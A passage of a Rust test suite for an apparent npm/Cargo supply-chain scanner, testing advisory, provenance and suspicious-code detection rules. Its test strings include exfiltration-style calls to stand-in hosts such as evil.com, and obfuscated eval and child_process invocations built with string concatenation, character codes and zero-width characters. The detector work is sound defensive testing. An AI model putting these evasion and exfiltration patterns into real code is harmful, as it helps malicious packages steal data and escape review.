        assert!(is_vm_invocation("vm.compileFunction('code')"));
        assert!(is_base64_decode("atob?.('payload')"));
        assert!(is_child_proc_invocation("cp?.spawn('sh')"));
    }

    #[test]
    fn blocks_on_malware_advisory() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let adv = AdvisoryReport {
            status: crate::advisory::AdvisoryStatus::Vulnerable,
            hits: vec![crate::advisory::AdvisoryItem {
                id: "MAL-2026-9999".into(),
                summary: "Credential stealer in package".into(),
                details: "".into(),
                aliases: vec![],
                severity: VerdictBand::Block,
                cvss_score: None,
                is_malware: true,
            }],
            source: "osv.dev".into(),
            message: None,
        };

        let verdict = evaluate_with_trust(
            "pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
            false,
            &Policy::default(),
            Some(&adv),
            None,
        );

        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R09_ADVISORY_MALWARE")
        );
    }

    #[test]
    fn blocks_on_critical_cve_advisory() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let adv = AdvisoryReport {
            status: crate::advisory::AdvisoryStatus::Vulnerable,
            hits: vec![crate::advisory::AdvisoryItem {
                id: "GHSA-xxxx".into(),
                summary: "Remote code execution".into(),
                details: "".into(),
                aliases: vec!["CVE-2026-1111".into()],
                severity: VerdictBand::Block,
                cvss_score: Some(9.8),
                is_malware: false,
            }],
            source: "osv.dev".into(),
            message: None,
        };

        let verdict = evaluate_with_trust(
            "pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
            false,
            &Policy::default(),
            Some(&adv),
            None,
        );

        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R09_ADVISORY_CRITICAL_CVE")
        );
    }

    #[test]
    fn blocks_on_provenance_digest_mismatch() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let prov = ProvenanceReport::failed_mismatch("digest hash mismatch");

        let verdict = evaluate_with_trust(
            "pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
            false,
            &Policy::default(),
            None,
            Some(&prov),
        );

        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "P03_PROVENANCE_DIGEST_MISMATCH")
        );
    }

    #[test]
    fn blocks_when_required_provenance_missing_or_repo_unauthorized() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let mut policy = Policy::default();
        policy.provenance.require_provenance = true;

        let prov_missing = ProvenanceReport::missing(false, None);
        let verdict = evaluate_with_trust(
            "pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
            false,
            &policy,
            None,
            Some(&prov_missing),
        );
        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "P03_PROVENANCE_REQUIRED_MISSING")
        );

        // Test unauthorized repository
        let mut policy_repo = Policy::default();
        policy_repo
            .provenance
            .allowed_repositories
            .push("github.com/trusted-org/".into());

        let prov_untrusted_repo = ProvenanceReport {
            status: ProvenanceStatus::Verified,
            slsa_level: 3,
            builder_id: Some("https://github.com/actions/runner".into()),
            source_repo: Some("https://github.com/attacker-org/malicious".into()),
            commit_sha: Some("1234567".into()),
            workflow_path: Some(".github/workflows/release.yml".into()),
            registry_signature_present: true,
            registry_signature_key_id: None,
            message: None,
        };

        let verdict_repo = evaluate_with_trust(
            "pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
            false,
            &policy_repo,
            None,
            Some(&prov_untrusted_repo),
        );
        assert_eq!(verdict_repo.band, VerdictBand::Block);
        assert!(
            verdict_repo
                .findings
                .iter()
                .any(|f| f.rule_id == "P03_UNAUTHORIZED_BUILD_REPO")
        );
    }

    #[test]
    fn enforces_repository_boundary_matching() {
        assert!(is_repo_allowed(
            "https://github.com/org/app",
            "github.com/org/app"
        ));
        assert!(is_repo_allowed(
            "git+https://github.com/org/app.git@refs/heads/main",
            "github.com/org/app"
        ));
        assert!(is_repo_allowed(
            "git+ssh://git@github.com/org/app.git",
            "org/app"
        ));
        assert!(is_repo_allowed("https://github.com/org/app", "org/app"));

        // Reject prefix / suffix / substring spoofing
        assert!(!is_repo_allowed(
            "https://github.com/org/app-malicious",
            "org/app"
        ));
        assert!(!is_repo_allowed(
            "https://github.com/attacker-org/app",
            "org/app"
        ));
        assert!(!is_repo_allowed(
            "https://github.com/attacker/org/app",
            "github.com/org/app"
        ));
    }

    #[test]
    fn detects_hardened_network_invocations() {
        assert!(is_network_invocation(
            "require('http').get('http://evil.com')"
        ));
        assert!(is_network_invocation("require('node:net').connect(1337)"));
        assert!(is_network_invocation(
            "require('http2').connect('https://evil.com')"
        ));
        assert!(is_network_invocation(
            "dns.resolveTxt('exfil.evil.com', cb)"
        ));
        assert!(is_network_invocation("import('node:https')"));
    }

    #[test]
    fn detects_hardened_eval_and_function_invocations() {
        assert!(is_eval_invocation(
            "const f = new (Function)('return process')();"
        ));
        assert!(is_eval_invocation("const run = (1, eval); run('id');"));
        assert!(is_eval_invocation("const f = AsyncFunction('return 1')"));
        assert!(is_eval_invocation("import('https://evil.com/payload.mjs')"));
        assert!(is_eval_invocation(
            "import('data:text/javascript,console.log(1)')"
        ));
        assert!(is_eval_invocation(
            "const fn = Reflect.get(globalThis, 'eval');"
        ));
        assert!(is_eval_invocation(
            "const fn = Reflect.get(window, 'Function');"
        ));
        assert!(is_eval_invocation("const fn = window['eval'];"));
        assert!(is_eval_invocation("const fn = globalThis['Function'];"));
        assert!(is_child_proc_invocation(
            "const { Worker } = require('worker_threads');"
        ));
        assert!(is_child_proc_invocation(
            "import { Worker } from 'node:worker_threads';"
        ));
    }

    #[test]
    fn prevents_false_positives_on_benign_identifiers() {
        assert!(!is_eval_invocation("const isFunc = isFunction(x);"));
        assert!(!is_eval_invocation("const val = timeval(s);"));
        assert!(!is_eval_invocation("const r = retrieval(key);"));
        assert!(!is_eval_invocation("const ch = String.fromCharCode(65);"));
        assert!(!is_eval_invocation(
            "const val = Reflect.get(target, prop);"
        ));
        assert!(!is_eval_invocation("const obj = window['localStorage'];"));
        assert!(!is_network_invocation("router.prefetch('/page');"));
        assert!(!is_network_invocation("query.refetch();"));
        assert!(!is_child_proc_invocation("const match = /test/.exec(str);"));
        assert!(!is_child_proc_invocation(
            "const w = new Worker('./worker.js');"
        ));
        assert!(!is_eval_invocation("class Foo { constructor() {} }"));
        assert!(!is_eval_invocation("this[handler](event);"));
        assert!(!is_eval_invocation("not_this[i]();"));
        assert!(!is_eval_invocation("my_global[fn]();"));
    }

    #[test]
    fn detects_string_concatenation_evasion() {
        assert!(is_eval_invocation("globalThis['e' + 'val']('evil()');"));
        assert!(is_eval_invocation("window[\"ev\" + \"al\"]('evil()');"));
        assert!(is_eval_invocation(
            "Reflect.get(globalThis, 'Func' + 'tion');"
        ));
        assert!(is_child_proc_invocation("require('child_' + 'process')"));
        assert!(is_child_proc_invocation(
            "require('node:' + 'child_process')"
        ));
        assert!(is_network_invocation("require('ht' + 'tp')"));
        assert!(is_base64_decode(
            "Buffer.from('payload', 'base' + '64').toString()"
        ));
    }

    #[test]
    fn detects_indirect_constructor_and_charcode_indexing() {
        assert!(is_eval_invocation(
            "const AsyncFunc = (async () => {}).constructor; AsyncFunc('return process')();"
        ));
        assert!(is_eval_invocation(
            "const f = [].constructor.constructor; f('return process')();"
        ));
        assert!(is_eval_invocation(
            "globalThis[String.fromCharCode(101,118,97,108)]('evil()')"
        ));
        assert!(is_eval_invocation(
            "window[String.fromCodePoint(101,118,97,108)]('evil()')"
        ));
        assert!(is_eval_invocation(
            "const e = 'e' + 'val'; globalThis[e]('evil()');"
        ));
        assert!(is_eval_invocation(
            "const k = String.fromCharCode(101,118,97,108); globalThis[k]('evil()');"
        ));
        assert!(is_eval_invocation("window[dynamicFunc]('payload');"));
        assert!(is_eval_invocation("globalThis[arr[0]]('payload');"));
    }

    #[test]
    fn detects_mainmodule_and_dynamic_vm_imports() {
        assert!(is_child_proc_invocation(
            "process.mainModule.require('child_process')"
        ));
        assert!(is_child_proc_invocation(
            "process['main' + 'Module'].require('fs')"
        ));
        assert!(is_child_proc_invocation("module.require('worker_threads')"));
        assert!(is_vm_invocation("import('node:vm')"));
        assert!(is_vm_invocation("require('node:' + 'vm')"));
        assert!(is_eval_invocation("import.meta.resolve('./evil.js')"));
    }

    #[test]
    fn detects_timer_string_eval_and_zero_width_spaces() {
        assert!(is_eval_invocation("setTimeout('process.exit(1)', 100);"));
        assert!(is_eval_invocation("setInterval(\"payload()\", 500);"));
        assert!(is_eval_invocation("setImmediate(`evil()`);"));
        assert!(is_eval_invocation("globalThis.setTimeout('evil()', 10);"));
        assert!(is_eval_invocation(
            "setTimeout(String.fromCharCode(101,118,97,108), 10);"
        ));
        assert!(is_eval_invocation("eval\u{200B}('process.exit(1)');"));
        assert!(is_eval_invocation("eval\u{200C}('process.exit(1)');"));
        assert!(is_eval_invocation("eval\u{200D}('process.exit(1)');"));
        assert!(is_eval_invocation("\u{FEFF}eval('process.exit(1)');"));
        assert!(is_eval_invocation("eval\u{00AD}('process.exit(1)');"));
        // Legitimate callback closures in timers should not trigger eval heuristic
        assert!(!is_eval_invocation("setTimeout(() => { doWork(); }, 100);"));
        assert!(!is_eval_invocation(
            "setInterval(function() { poll(); }, 500);"
        ));
    }

    #[test]
    fn detects_this_dynamic_eval_dlopen_cluster_and_wasm() {
        assert!(is_eval_invocation("this['ev' + 'al']('payload');"));
        assert!(is_eval_invocation("this[\"Function\"]('payload');"));
        assert!(is_eval_invocation("WebAssembly.instantiate(wasmBytes)"));
        assert!(is_eval_invocation("WebAssembly.compile(wasmBuffer)"));
        assert!(is_child_proc_invocation(
            "process.dlopen(module, './evil.node')"
        ));
        assert!(is_child_proc_invocation("dlopen(module, './evil.node')"));
        assert!(is_child_proc_invocation(
            "const cluster = require('cluster'); cluster.fork();"
        ));
        assert!(is_child_proc_invocation(
            "import cluster from 'node:cluster'"
        ));
        assert!(is_network_invocation("require('got')('https://evil.com')"));
        assert!(is_network_invocation("import fetch from 'node-fetch'"));
        assert!(is_network_invocation(
            "require('superagent').get('http://evil.com')"
        ));
        assert!(is_network_invocation(
            "navigator.sendBeacon('http://evil.com', data)"
        ));
    }

    #[test]
    fn detects_charcode_reconstructed_module_names() {
        assert!(is_child_proc_invocation(
            "var c = String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115); require(c).exec('id');"
        ));
        assert!(is_child_proc_invocation(
            "var c = String.fromCodePoint(99,104,105,108,100,95,112,114,111,99,101,115,115); require(c).exec('id');"
        ));
        assert!(is_child_proc_invocation(
            "var c = String.fromCharCode(0x63,0x68,0x69,0x6c,0x64,0x5f,0x70,0x72,0x6f,0x63,0x65,0x73,0x73); require(c).exec('id');"
        ));
        assert!(is_child_proc_invocation(
            "require('child_' + String.fromCharCode(112,114,111,99,101,115,115))"
        ));
        assert!(is_vm_invocation("require(String.fromCharCode(118,109))"));
        assert!(is_network_invocation(
            "require(String.fromCharCode(104,116,116,112))"
        ));
    }

    #[test]
    fn charcode_folding_leaves_unparseable_calls_untouched() {
        assert!(!is_child_proc_invocation(
            "String.fromCharCode(99+x).repeat(2);"
        ));
        assert!(!is_child_proc_invocation(
            "String.fromCharCode(72,101,108,108,111);"
        ));
        assert!(!is_eval_invocation("String.fromCharCode();"));
        assert!(!is_child_proc_invocation(
            "String.fromCharCode(99999999999999999999);"
        ));
        assert!(fold_char_code_calls("const x = 1;") == "const x = 1;");
        assert!(fold_char_code_calls("héllo — fromCharCod") == "héllo — fromCharCod");
        assert!(
            fold_char_code_calls("String.fromCharCode(99+x).repeat(2);")
                == "String.fromCharCode(99+x).repeat(2);"
        );
        assert!(
            fold_char_code_calls("String.fromCharCode(0xD800,104);")
                == "String.fromCharCode(0xD800,104);"
        );
        assert!(
            fold_char_code_calls("String.fromCodePoint(0x110000,65);")
                == "String.fromCodePoint(0x110000,65);"
        );
    }

    #[test]
    fn charcode_folding_stays_fast_on_repeated_unparseable_calls() {
        let input = "fromCharCode(".repeat(200_000);
        let start = std::time::Instant::now();
        assert_eq!(fold_char_code_calls(&input), input);
        let elapsed = start.elapsed();
        assert!(
            elapsed.as_secs() < 10,
            "folding went superlinear: {elapsed:?}"
        );
    }

    #[test]
    fn charcode_folding_handles_interleaved_markers() {
        assert_eq!(
            fold_char_code_calls("fromCodePoint(99) fromCharCode(118,109)"),
            "'c' 'vm'"
        );
        assert_eq!(
            fold_char_code_calls("String.fromCharCode(99,x) String.fromCharCode(118,109)"),
            "String.fromCharCode(99,x) 'vm'"
        );
        assert_eq!(
            fold_char_code_calls("a fromCharCode(118,109) b fromCodePoint(99) c"),
            "a 'vm' b 'c' c"
        );
        assert_eq!(
            fold_char_code_calls("String.fromCharCode(118,109)tail"),
            "'vm'tail"
        );
    }

    fn yanked_delta() -> Delta {
        Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.1.0".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        }
    }

    #[test]
    fn flags_yanked_predecessor_as_medium() {
        let delta = yanked_delta();
        let verdict = evaluate_with_trust(
            "test-pkg",
            Ecosystem::Npm,
            "sha256:abc",
            &delta,
            false,
            true,
            &Policy::default(),
            None,
            None,
        );
        let r08 = verdict
            .findings
            .iter()
            .find(|f| f.rule_id == "R08_YANKED_PREDECESSOR");
        assert!(
            r08.is_some(),
            "expected R08 finding, got {:?}",
            verdict.findings
        );
        assert_eq!(r08.unwrap().severity, VerdictBand::Medium);
        // Medium findings contribute to the risk score.
        assert_eq!(verdict.risk_score, 10);
        assert_eq!(verdict.band, VerdictBand::Medium);
    }

    #[test]
    fn no_yanked_predecessor_finding_when_prior_is_live() {
        let delta = yanked_delta();
        let verdict = evaluate_with_trust(
            "test-pkg",
            Ecosystem::Cargo,
            "sha256:abc",
            &delta,
            false,
            false,
            &Policy::default(),
            None,
            None,
        );
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R08_YANKED_PREDECESSOR")
        );
        assert_eq!(verdict.band, VerdictBand::Low);
        assert_eq!(verdict.ecosystem, Ecosystem::Cargo);
    }
}
